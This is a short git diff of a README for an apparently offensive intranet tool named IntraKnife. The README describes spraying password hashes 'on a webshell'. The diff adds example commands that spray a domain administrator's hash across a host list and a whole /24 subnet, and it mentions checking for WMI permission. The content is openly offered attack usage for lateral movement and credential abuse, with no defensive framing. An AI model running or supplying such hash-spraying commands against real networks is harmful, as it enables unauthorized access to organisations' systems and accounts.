@@ -11,6 +11,8 @@ U can use this tool to spray hash on a webshell
 ```
 IntraKnife.exe -m spray -l com.txt -U user.txt -P admin123
 IntraKnife.exe -m spray -l com.txt -U user.txt -ha xxxxxxxxxxxxxxxxxxxxxxxxx
+IntraKnife.exe -m spray -l com.txt -u cia\administrator -ha xxxxxxxxxxxxxxxxxxxxxxxxx
+IntraKnife.exe -m spray -c 10.10.1.1/24 -u cia\administrator -ha xxxxxxxxxxxxxxxxxxxxxxxxx
 ```
 u can use `-A` to check if this user has wmi permission
 
